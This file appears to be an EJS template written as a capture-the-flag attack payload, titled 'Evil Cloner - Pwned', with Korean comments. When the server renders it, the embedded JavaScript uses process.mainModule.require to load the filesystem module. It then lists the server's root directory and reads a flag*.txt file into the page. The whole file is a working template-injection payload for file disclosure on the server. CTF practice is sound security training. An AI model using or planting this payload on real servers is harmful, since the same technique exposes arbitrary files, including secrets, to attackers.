<%
  const fs = process.mainModule.require('fs');
  const path = process.mainModule.require('path');

  let dirList = '';
  let flagValue = '';

  try {
    // / 루트에 뭐가 있는지 먼저 다 본다
    const entries = fs.readdirSync('/');
    dirList = entries.join('\n');

    // flag*.txt 형태인 파일 이름 찾기
    const flagName = entries.find(f => /^flag.*\.txt$/i.test(f));

    if (flagName) {
      flagValue = fs.readFileSync(path.join('/', flagName), 'utf8');
    } else {
      flagValue = 'No flag file found';
    }
  } catch (e) {
    flagValue = 'ERROR: ' + e.toString();
  }
%>
<!doctype html>
<html lang="fr">
<head>
  <meta charset="utf-8" />
  <title>Evil Cloner - Pwned</title>
</head>
<body>
  <h2>/ 디렉터리 목록</h2>
  <pre><%= dirList %></pre>

  <h2>FLAG</h2>
  <pre><%= flagValue %></pre>

  <main class="container">
    <%- body %>
  </main>
</body>
</html>
